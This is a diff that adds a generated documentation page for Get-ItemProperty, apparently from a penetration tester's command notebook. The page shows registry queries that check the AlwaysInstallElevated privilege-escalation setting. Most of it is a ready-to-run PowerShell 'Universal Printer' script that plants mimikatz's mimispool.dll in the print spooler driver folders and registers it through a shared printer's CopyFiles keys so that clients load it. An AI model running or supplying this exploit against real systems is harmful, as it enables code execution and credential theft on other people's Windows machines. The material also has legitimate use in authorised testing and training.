@@ -1,0 +1,69 @@
+---
+title: "Get-ItemProperty"
+sidebarTitle: "Get-ItemProperty"
+description: "Commands and examples collected from your Get-ItemProperty notes."
+keywords: ["Get-ItemProperty", "New-ItemProperty"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/get-itemproperty.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=get-itemproperty) · [All tools](/index)
+
+## AlwaysInstallElevated
+
+**Notebook example**
+
+```powershell
+Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
+Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+1 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="Universal Printer">
+
+### Universal Printer
+
+**Windows Privilege Escalation: Full Checklist**
+
+```ps1
+$printerName     = 'Universal Priv Printer'
+$system32        = $env:systemroot + '\system32'
+$drivers         = $system32 + '\spool\drivers'
+$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
+ 
+Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
+Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
+Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
+ 
+Add-PrinterDriver -Name       'Generic / Text Only'
+Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
+ 
+New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
+```
+
+</Accordion>
+
+</AccordionGroup>
